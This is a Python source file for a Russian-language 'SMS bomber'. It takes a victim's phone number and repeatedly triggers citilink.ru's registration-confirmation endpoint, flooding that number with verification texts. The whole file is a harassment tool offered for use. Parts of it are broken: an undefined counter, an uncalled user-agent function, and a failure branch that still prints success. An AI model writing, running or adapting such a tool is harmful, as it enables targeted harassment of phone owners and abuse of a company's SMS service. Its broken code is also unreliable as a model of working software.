# -*- coding: utf-8 -*-
import time
import os
import datetime
import random
import sys
import requests
import threading
from threading import Timer, Thread
from datetime import datetime, timedelta
import random
from useragent import get_agent

class cloop(object):
    def __init__(self):
        pass

    def sms1(self, _phone, kolvos):
        ua = get_agent
        if _phone[0] == "+":
            _phone = _phone[1:]
        if _phone[0] == "8":
            _phone = "7" + _phone[1:]
        if _phone[0] == "9":
            _phone = "7" + _phone

        _name = ""
        for x in range(12):
            _name = _name + random.choice(
                list("123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM")
            )
            password = _name + random.choice(
                list("123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM")
            )
            username = _name + random.choice(
                list("123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM")
            )
        iteration = 0
        sms_amount = 0
        _phone9 = _phone[1:]
        _phoneAresBank = (
            "+"
            + _phone[0]
            + "("
            + _phone[1:4]
            + ")"
            + _phone[4:7]
            + "-"
            + _phone[7:9]
            + "-"
            + _phone[9:11]
        )  # +7+(915)350-99-08
        _phone9dostavista = (
            _phone9[:3] + "+" + _phone9[3:6] + "-" + _phone9[6:8] + "-" + _phone9[8:10]
        )  # 915+350-99-08
        _phoneOstin = (
            "+"
            + _phone[0]
            + "+("
            + _phone[1:4]
            + ")"
            + _phone[4:7]
            + "-"
            + _phone[7:9]
            + "-"
            + _phone[9:11]
        )  # '+7+(915)350-99-08'
        _phonePizzahut = (
            "+"
            + _phone[0]
            + " ("
            + _phone[1:4]
            + ") "
            + _phone[4:7]
            + " "
            + _phone[7:9]
            + "-"
            + _phone[9:11]
        )  # '+7 (915) 350 99 08'
        _phoneGorzdrav = (
            _phone[1:4] + ") " + _phone[4:7] + "-" + _phone[7:9] + "-" + _phone[9:11]
        )  # '915) 350-99-08'
        _email = _name + f"{iteration}" + "@gmail.com"
        email = _name + f"{iteration}" + "@gmail.com"
        request_timeout = 0.00001
        kolvos = int(kolvos)
        print(
            f"""

бомбер начнет работу через 5 секунд, жди.
ежели хочешь остановить, нажми CTRL + Z
			"""
        )
        time.sleep(5)
        for kolvo in range(kolvos):
            kolvo = int(kolvo)
            standar_headers = {"User-Agent": ua}

           
            try:
                requests.post(
                    "https://www.citilink.ru/registration/confirm/phone/+"
                    + _phone
                    + "/"
                )
                kk = kk + 1
                print(
                    f"SMS отправлено успешно ЛОЛ {_phonePizzahut}"
                )
                time.sleep(0.2)
            except:
                print(f"SMS отправлено успешно")

            kolvo = kolvo + 1
            if kolvo == kolvos:
                print(
                    f"последний цикл {kolvo} окончен, я заканчиваю работу"
                )
                time.sleep(100)
                exit()
            else:
                print(
                    f"цикл {kolvo} пройден, жди 5 секунд"
                )
                time.sleep(5)

def main():
    print(100*'\n')
    print("@vatcuo бомбер")
    print("0.1б | форк")
    sms()
def sms():
    phone = input('введи номер без +: ')
    if len(phone) == 11 or len(phone) == 12:
        ra = cloop()
        kolvos = input("введи количество циклов: ")
        ra.sms1(phone, kolvos)
    else:
        print(f"номер введен неправильно")
        time.sleep(3)
        sms()
main()
